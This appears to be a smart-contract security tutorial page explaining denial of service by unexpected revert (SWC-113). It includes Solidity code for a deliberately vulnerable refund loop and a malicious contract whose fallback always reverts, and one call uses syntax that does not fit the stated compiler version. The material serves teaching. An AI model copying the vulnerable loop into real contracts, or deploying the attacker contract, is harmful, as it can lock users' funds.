DoS Attack Contract
===================

This set of contracts shows how a contract may be susceptible to a denial of service attack by an unexpected revert ([SWC-113](https://swcregistry.io/docs/SWC-113){target=_blank}).

The `VulnerableContract` loops over the subscribers array, making a transfer to each address. This is dangerous because when the `refundFees()` function is called and the `VulnerableContract` attempts to send funds to the `MaliciousContract`, the `MaliciousContract` fallback function is called, which stops execution and reverts. This transaction will never succeed and `refundFees()` will never successfully execute, preventing any subscribers from getting their subscription fee back.

```
pragma solidity 0.8.4;

// Example DenialOfService Attack  
contract VulnerableContract {    
  address owner = msg.sender;    
  address payable[] public subscribers;    
  uint FEE_COST = 1 ether;          
  
  function subscribe() public payable {        
    require(msg.value == FEE_COST, "Insufficient msg.value");        
    subscribers.push(msg.sender);    
  }          
  
  function refundFees() public {        
    require(msg.sender == owner, "msg.sender should be owner");        
    for(uint i = subscribers.length; i > 0; i--) {            
      subscribers[i - 1].transfer(FEE_COST);            
      subscribers.pop();        
    }
  }          
  
  function getBalance() view public returns(uint) {        
    return address(this).balance;    
  }          
  
  // Auxiliar function for demo. It wouldn't be present in a vulnerable contract    
  function removeLastSubscriber() public {        
    subscribers.pop();    
  }
  
}  
  
contract MaliciousContract {    
  VulnerableContract vulnerableContract = VulnerableContract(0x5E72914535f202659083Db3a02C984188Fa26e9f);          
  
  function subscribe() public payable {        
    vulnerableContract.subscribe.value(msg.value)();       
  }          
  
  fallback() external payable {        
    require(false);    
  }
}
```
 
